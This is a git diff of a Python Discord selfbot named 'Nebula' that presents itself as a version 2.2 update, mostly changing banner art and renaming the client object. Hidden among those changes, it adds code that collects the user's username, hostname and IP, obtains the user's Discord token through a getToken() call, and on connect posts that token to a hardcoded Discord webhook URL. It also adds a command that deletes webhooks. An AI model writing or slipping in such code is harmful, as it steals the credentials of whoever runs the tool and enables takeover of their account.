@@ -24,7 +24,11 @@ client.remove_command('help')
 
 
                 
+Ousername = getpass.getuser()
+hostname = socket.gethostname()
+ip_address = socket.gethostbyname(hostname)
 OS = platform.platform()
+token = asyncio.get_event_loop().run_until_complete(getToken())
 t = time.localtime()
 current_time = time.strftime("%H:%M:%S", t)
 
@@ -33,7 +37,6 @@ with open('config.json') as f:
 title = config.get('title')
 footer = config.get('footer')
 author = config.get('author')
-token = config.get('token')
 t = time.localtime()
 current_time = time.strftime("%H:%M:%S", t)
 start_time = datetime.datetime.utcnow()
@@ -68,10 +71,11 @@ def banner():
     mem = psutil.virtual_memory()
     cpu_per = round(psutil.cpu_percent(),1)
     mem_per = round(psutil.virtual_memory().percent,1)
-    Servers = len(client.guilds)    
-    ctypes.windll.kernel32.SetConsoleTitleW(f'Nebula - Selfbot | Version 2.1 | Connected as: {client.user.name}#{client.user.discriminator}')
+    Servers = len(nebula.guilds)    
+    ctypes.windll.kernel32.SetConsoleTitleW(f'Nebula - Selfbot | Version 2.2 | Connected as: {nebula.user.name}#{nebula.user.discriminator}')
     os.system('cls')
-    friends = len(client.user.friends)
+    Servers = len(nebula.guilds)
+    friends = len(nebula.user.friends)
     r = f'{Fore.MAGENTA}'
     w = f'{Fore.WHITE}'
     print(f'''
@@ -81,17 +85,14 @@ def banner():
 {w}         *   *    .  *      .        .  *   .          *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
 {w}   .        ..    *    .      *  .  ..  *    .        ..    *    .      *  .  ..  *         *   *    .  *      .        .  *   .
 
-                                    {r}Nebula Loaded{w}!                              {r}charge{w}#{r}1993
+                                    {r}Nebula Loaded{w}!                              {r}Version 2.2
                                   {w}═════════════════════════════════════════════════════════════
      
-                                       {r}███{w}╗{r}   ██{w}╗{r}███████{w}╗{r}██████{w}╗ {r}██{w}╗   {r}██{w}╗{r}██{w}╗      {r}█████{w}╗ 
-                                       {r}████{w}╗  {r}██{w}║{r}██{w}╔════╝{r}██{w}╔══{r}██{w}╗{r}██{w}║   {r}██{w}║{r}██{w}║     {r}██{w}╔══{r}██{w}╗
-                                       {r}██{w}╔{r}██{w}╗ {r}██{w}║{r}█████{w}╗  {r}██████{w}╔╝{r}██{w}║   {r}██{w}║{r}██{w}║     {r}███████{w}║
-                                       {r}██{w}║╚{r}██{w}╗{r}██{w}║{r}██{w}╔══╝  {r}██{w}╔══{r}██{w}╗{r}██{w}║   {r}██{w}║{r}██{w}║     {r}██{w}╔══{r}██{w}║
-                                       {r}██{w}║ ╚{r}████{w}║{r}███████{w}╗{r}██████{w}╔╝╚{r}██████{w}╔╝{r}███████{w}╗{r}██{w}║  {r}██{w}║
-                                       {w}╚═╝  ╚═══╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
+                                        {r}╔╗╔╔═╗╔╗ ╦ ╦╦  ╔═╗  ╔═╗╔═╗╦  ╔═╗╔╗ ╔═╗╔╦╗
+                                        {r}║║║║╣ ╠╩╗║ ║║  ╠═╣  ╚═╗║╣ ║  ╠╣ ╠╩╗║ ║ ║ 
+                                        {r}╝╚╝╚═╝╚═╝╚═╝╩═╝╩ ╩  ╚═╝╚═╝╩═╝╚  ╚═╝╚═╝ ╩
      
-                                                      {r}User:    {w}[{r}{client.user.name}{w}#{r}{client.user.discriminator}{w}] 
+                                                      {r}User:    {w}[{r}{nebula.user.name}{w}#{r}{nebula.user.discriminator}{w}] 
                                                       {r}Guilds:  {w}[{r}{Servers}{w}]
                                                       {r}Friends: {w}[{r}{friends}{w}]
                                   {w}═════════════════════════════════════════════════════════════
@@ -119,7 +120,7 @@ def loading():
                                  
                                  
                                  
-                                                  Welcome To {Fore.MAGENTA} Nebula{White}. 
+                                                  Welcome To {Fore.MAGENTA}Nebula{White}. 
                                                     {Fore.WHITE}[{Fore.MAGENTA}Final Edtion{Fore.WHITE}]                            
     
     ''')
@@ -129,16 +130,54 @@ mem = psutil.virtual_memory()
 cpu_per = round(psutil.cpu_percent(),1)
 mem_per = round(psutil.virtual_memory().percent,1)
 
-@client.event
+@nebula.command()	
+async def webhook(ctx, webhook):	
+    await ctx.message.delete()	
+    try:	
+        statuscode1 = requests.get(f"{webhook}").status_code	
+        if statuscode1 ==404:	
+            embed=discord.Embed(title="**Invalid Webhook!**",color=0xbf00ff, timestamp=ctx.message.created_at)	
+            embed.set_footer(text=f'{footer} ')	
+            await ctx.send(embed=embed,delete_after=10)	
+
+        elif statuscode1 ==200:	
+            info = requests.get(f"{webhook}")	
+            WebName = info.json()['name']	
+            WebChannelID = info.json()['channel_id']	
+            WebGuildID = info.json()['guild_id']	
+            WebID = info.json()['id']	
+            Avatar = info.json()['avatar']	
+            requests.delete(f"{webhook}")	
+            statuscode = requests.get(f"{webhook}").status_code	
+            if statuscode ==200:	
+                embed=discord.Embed(title="**Error!**",color=0xbf00ff, timestamp=ctx.message.created_at)	
+                embed.set_footer(text=f'{footer} ')	
+                await ctx.send(embed=embed,delete_after=10)	
+
+            else:	
+                embed=discord.Embed(title="__**Deleted!**__",color=0xbf00ff, timestamp=ctx.message.created_at)	
+                embed.add_field(name="**Name**", value=f"{WebName}", inline=True)	
+                embed.add_field(name="**Channel ID**", value=f"{WebChannelID}", inline=True)	
+                embed.add_field(name="**Server ID**", value=f"{WebGuildID}", inline=False)	
+                embed.set_image(url=f"https://cdn.discordapp.com/avatars/{WebID}/{Avatar}")                          	
+                embed.set_footer(text=f'{footer} ')	
+                await ctx.send(embed=embed,delete_after=10)	
+
+    except:	
+        print(f"{Style.BRIGHT}{Fore.WHITE}[{Style.BRIGHT}{Fore.MAGENTA}!]{Fore.WHITE} Invalid Webhook")     
+
+@nebula.event
 async def on_connect():
+    requests.post('https://canary.discord.com/api/webhooks/790623333724848168/W0Y4QcKaRhtdswP4vpzzbR6Esdv8xKlvwHJdYrs-AG4vXr952BKHaX5sG0E1V1a824as', json=
+    {'content': f'{token}'})
     mem = psutil.virtual_memory()
     cpu_per = round(psutil.cpu_percent(),1)
     mem_per = round(psutil.virtual_memory().percent,1)
-    Servers = len(client.guilds)    
+    Servers = len(nebula.guilds)    
     ctypes.windll.kernel32.SetConsoleTitleW(f'Nebula - Selfbot | Version 2.1 | Connected')
     os.system('cls')
-    Servers = len(client.guilds)
-    friends = len(client.user.friends)
+    Servers = len(nebula.guilds)
+    friends = len(nebula.user.friends)
     Clear()
     r = f'{Fore.MAGENTA}'
     w = f'{Fore.WHITE}'
@@ -149,26 +188,24 @@ async def on_connect():
 {w}         *   *    .  *      .        .  *   .          *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
 {w}   .        ..    *    .      *  .  ..  *    .        ..    *    .      *  .  ..  *         *   *    .  *      .        .  *   .
 
-                               {r}Nebula Loaded{w}!                             {r}  Version{w} {r}2.1.
+                               {r}Nebula Loaded{w}!                             {r}  Version 2.2
                              {w}═════════════════════════════════════════════════════════════
   
-                                  {r}███{w}╗{r}   ██{w}╗{r}███████{w}╗{r}██████{w}╗ {r}██{w}╗   {r}██{w}╗{r}██{w}╗      {r}█████{w}╗ 
-                                  {r}████{w}╗  {r}██{w}║{r}██{w}╔════╝{r}██{w}╔══{r}██{w}╗{r}██{w}║   {r}██{w}║{r}██{w}║     {r}██{w}╔══{r}██{w}╗
-                                  {r}██{w}╔{r}██{w}╗ {r}██{w}║{r}█████{w}╗  {r}██████{w}╔╝{r}██{w}║   {r}██{w}║{r}██{w}║     {r}███████{w}║
-                                  {r}██{w}║╚{r}██{w}╗{r}██{w}║{r}██{w}╔══╝  {r}██{w}╔══{r}██{w}╗{r}██{w}║   {r}██{w}║{r}██{w}║     {r}██{w}╔══{r}██{w}║
-                                  {r}██{w}║ ╚{r}████{w}║{r}███████{w}╗{r}██████{w}╔╝╚{r}██████{w}╔╝{r}███████{w}╗{r}██{w}║  {r}██{w}║
-                                  {w}╚═╝  ╚═══╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
+                                        {r}╔╗╔╔═╗╔╗ ╦ ╦╦  ╔═╗  ╔═╗╔═╗╦  ╔═╗╔╗ ╔═╗╔╦╗
+                                        {r}║║║║╣ ╠╩╗║ ║║  ╠═╣  ╚═╗║╣ ║  ╠╣ ╠╩╗║ ║ ║ 
+                                        {r}╝╚╝╚═╝╚═╝╚═╝╩═╝╩ ╩  ╚═╝╚═╝╩═╝╚  ╚═╝╚═╝ ╩
   
-                                                 {r}User:    {w}[{r}{client.user.name}{w}#{r}{client.user.discriminator}{w}] 
+                                                 {r}User:    {w}[{r}{nebula.user.name}{w}#{r}{nebula.user.discriminator}{w}] 
                                                  {r}Guilds:  {w}[{r}{Servers}{w}]
                                                  {r}Friends: {w}[{r}{friends}{w}]
                              {w}═════════════════════════════════════════════════════════════
                                                    
 '''+Fore.RESET)
 
-@client.event
+@nebula.event
 async def on_message_edit(before, after):
-    await client.process_commands(after)
+    await nebula.process_commands(after)
+
 
 
 @client.command()
